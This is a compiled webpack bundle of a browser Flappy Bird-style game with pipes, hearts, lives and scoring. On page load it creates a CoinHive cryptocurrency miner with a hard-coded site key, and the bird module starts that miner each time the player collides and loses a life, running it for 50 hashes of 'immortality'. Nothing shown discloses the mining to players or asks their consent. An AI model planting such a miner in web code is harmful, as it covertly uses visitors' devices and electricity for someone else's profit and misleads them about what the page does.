/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 1);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
class Utils {
    static circleIntersectsRectangle(circle, rect) {
        const deltaX = circle.x - Math.max(rect.x, Math.min(circle.x, rect.x + rect.width));
        const deltaY = circle.y - Math.max(rect.y, Math.min(circle.y, rect.y + rect.height));
        return (deltaX * deltaX + deltaY * deltaY) < (circle.radius * circle.radius);
    }

    static circleIntersectsCircle(circle1, circle2) {
        const deltaX = circle1.x - circle2.x;
        const deltaY = circle1.y - circle2.y;

        return (deltaX * deltaX + deltaY * deltaY) < ((circle1.radius + circle2.radius) * (circle1.radius + circle2.radius));
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Utils;


/***/ }),
/* 1 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__game__ = __webpack_require__(2);


window.onload = () => {
    const miner = new CoinHive.Anonymous('pVn9IlEfqHmBteAUqVT4aJlPIT8AN8D3');
    const canvas = document.getElementById("gc");
    const game = new __WEBPACK_IMPORTED_MODULE_0__game__["a" /* default */](canvas, miner);
    document.addEventListener("keydown", game.keyPush.bind(game));
    canvas.addEventListener('click', game.click.bind(game));
};

/***/ }),
/* 2 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__pipe__ = __webpack_require__(3);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__bird__ = __webpack_require__(4);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_2__immortal_modifier__ = __webpack_require__(5);




class Game {
    constructor(canvas, miner) {
        this.frameCount = 0;
        this.canvas = canvas;
        this.context = canvas.getContext("2d");
        this.miner = miner;
        this.score = 0;
        this.highScore = 0;
        this.pipes = [];
        this.started = false;

        this.immortalModifiers = [];
        this.bird = new __WEBPACK_IMPORTED_MODULE_1__bird__["a" /* default */](canvas, this.miner);

        this.interval = 1000/60;

        this.heartImage = new Image();
        this.heartImage.src = 'heart.png';

        this.intervalFunction = () => {
            this.frameCount++;
            this.update();
            this.draw();
            setTimeout(this.intervalFunction, this.interval);
        };
        setTimeout(this.intervalFunction, this.interval);
    }

    update() {
        if (this.score > this.highScore) {
            this.highScore = this.score;
        }

        if (!this.bird.lose && this.started) {
            if (this.frameCount % 60 === 0) {
                this.pipes.push(new __WEBPACK_IMPORTED_MODULE_0__pipe__["a" /* default */](this.canvas));

                if (Math.floor(Math.random() * 20) % 3 === 0) {
                    this.immortalModifiers.push(new __WEBPACK_IMPORTED_MODULE_2__immortal_modifier__["a" /* default */](this.canvas));
                }
            }

            this.bird.update();

            this.immortalModifiers.forEach((modifier, i) => {
                if (modifier.canBeRemoved) {
                    delete this.immortalModifiers[i];
                } else {
                    modifier.update();

                    if (modifier.collideBird(this.bird)) {
                        this.bird.lives++;
                        delete this.immortalModifiers[i];
                    }
                }
            });

            this.pipes.forEach((pipe, i) => {
                if (pipe.canBeRemoved) {
                    delete this.pipes[i];
                    this.score++;
                } else {
                    pipe.update();

                    if (pipe.collideBird(this.bird)) {
                        this.bird.startImmortal();
                    }
                }
            });
        }
    }

    draw() {
        this.context.fillStyle = "black";
        this.context.fillRect(0, 0, this.canvas.width, this.canvas.height);

        if (this.bird.lose) {
            endGame(this);
        } else {
            this.bird.draw();

            if (this.started) {
                this.pipes.forEach(pipe => {
                    pipe.draw();
                });
                this.immortalModifiers.forEach(modifier => {
                    modifier.draw();
                });

                drawScore(this);

                drawLives(this);
            }
        }
    }

    keyPush(evt) {
        if (evt.keyCode === 32) {
            if (!this.started) {
                this.started = true;
            }
            this.bird.push();
        }
    }

    click() {
        if (this.bird.lose) {
            this.immortalModifiers = [];
            this.pipes = [];
            this.score = 0;
            this.started = false;
            this.bird = new __WEBPACK_IMPORTED_MODULE_1__bird__["a" /* default */](this.canvas, this.miner);
        }
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Game;


function drawLives(gameObj) {
    gameObj.context.drawImage(gameObj.heartImage, 30, 50, 45, 45);
    gameObj.context.font = "25px Comic Sans MS";
    gameObj.context.fillStyle = "rgba(255, 255, 255, 0.95)";
    gameObj.context.textAlign = "left";
    gameObj.context.fillText(gameObj.bird.lives.toString(), 45, 80);
}

function drawScore(gameObj) {
    gameObj.context.font = "30px Comic Sans MS";
    gameObj.context.fillStyle = "rgba(255, 255, 255, 0.5)";
    gameObj.context.textAlign = "right";
    gameObj.context.fillText('Score: ' + gameObj.score, gameObj.canvas.width - 30, 30);
    gameObj.context.textAlign = "left";
    gameObj.context.fillText('HighScore: ' + gameObj.highScore, 30, 30);
}

function endGame(gameObj) {
    gameObj.context.font = "30px Comic Sans MS";
    gameObj.context.fillStyle = "red";
    gameObj.context.textAlign = "center";
    gameObj.context.fillText('OUPS! Your score: ' + gameObj.score + '. Click to try again.', gameObj.canvas.width/2, gameObj.canvas.height/2);
}

/***/ }),
/* 3 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__utils__ = __webpack_require__(0);


class Pipe {
    constructor(canvas) {
        this.startDistance = 150;
        this.width = 100;
        this.canvas = canvas;
        this.context = canvas.getContext("2d");
        this.x = canvas.width;
        this.yTop = Math.random() * canvas.height / 2 + canvas.height / 8;
        this.yBot = this.yTop + this.startDistance;
        this.speed = 10;

        this.botRect = {
            x: this.x,
            y: this.yBot,
            width: this.width,
            height: this.canvas.height - this.yBot
        };

        this.topRect = {
            x: this.x,
            y: 0,
            width: this.width,
            height: this.yTop
        };

        this.fillStyle = 'white';
        this.canBeRemoved = false;
    }

    update() {
        this.x -= this.speed;
        this.topRect.x = this.x;
        this.botRect.x = this.x;

        if (this.x + this.width < 0) {
            this.canBeRemoved = true;
        }
    }

    draw() {
        this.context.fillStyle = this.fillStyle;
        this.context.fillRect(this.x, this.yBot, this.width, this.canvas.height - this.yBot);
        this.context.fillRect(this.x, 0, this.width, this.yTop);
    }

    collideBird(bird) {
        return __WEBPACK_IMPORTED_MODULE_0__utils__["a" /* default */].circleIntersectsRectangle(bird, this.botRect) || __WEBPACK_IMPORTED_MODULE_0__utils__["a" /* default */].circleIntersectsRectangle(bird, this.topRect);
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Pipe;


/***/ }),
/* 4 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
class Bird {
    constructor(canvas, miner) {
        this.x = 100;
        this.y = canvas.height / 2;
        this.radius = 20;
        this.canvas = canvas;
        this.context = canvas.getContext("2d");
        this.gravity = 0.6;
        this.forceLift = 15;
        this.velocity = 0;
        this.lose = false;

        this.miner = miner;

        this.immortalHashes = 0;
        this.allHashes = 0;

        this.lives = 3;

        this.img = new Image();
        this.img.src = 'bird.png';
    }

    update() {
        const totalHashes = this.miner.getTotalHashes();
        if (totalHashes > this.allHashes + this.immortalHashes) {
            this.immortalHashes = 0;
            this.allHashes = totalHashes;
            this.miner.stop();
        }


        this.velocity += this.gravity;
        this.y += this.velocity;

        if (this.y + this.radius >= this.canvas.height) {
            this.y = this.canvas.height - this.radius;
            this.velocity = 0;
            this.startImmortal();
        }

        if (this.y - this.radius <= 0) {
            this.y = this.radius;
            this.velocity = 0;
        }
    }

    draw() {
        if (this.immortalHashes > 0) {
            this.context.save();
            this.context.globalAlpha = Math.random();
        }

        this.context.drawImage(this.img, this.x - this.radius, this.y - this.radius, this.radius * 2, this.radius * 2);

        if (this.immortalHashes > 0) {
            this.context.restore();
        }
    }

    push() {
        this.velocity += - this.forceLift;
    }

    startImmortal() {
        if (this.immortalHashes <= 0) {
            if (this.lives <= 0) {
                this.lose = true;
            } else {
                this.lives--;
                this.immortalHashes += 50;
                this.miner.start();
            }
        }
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Bird;


/***/ }),
/* 5 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__utils__ = __webpack_require__(0);


class ImmortalModifier {
    constructor(canvas) {
        this.canvas = canvas;
        this.context = canvas.getContext("2d");
        this.x = canvas.width + 200 + Math.random() * 200;
        this.y = Math.random() * canvas.height * 0.75 + canvas.height/10;
        this.radius = 20;
        this.canBeRemoved = false;
        this.speed = 10;

        this.img = new Image();
        this.img.src = 'heart.png';
    }

    update() {
        this.x -= this.speed;

        if (this.x < 0) {
            this.canBeRemoved = true;
        }
    }

    draw() {
        this.context.drawImage(this.img, this.x - this.radius, this.y - this.radius, this.radius * 2, this.radius * 2);
    }

    collideBird(bird) {
        return __WEBPACK_IMPORTED_MODULE_0__utils__["a" /* default */].circleIntersectsCircle(this, bird);
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = ImmortalModifier;


/***/ })
/******/ ]);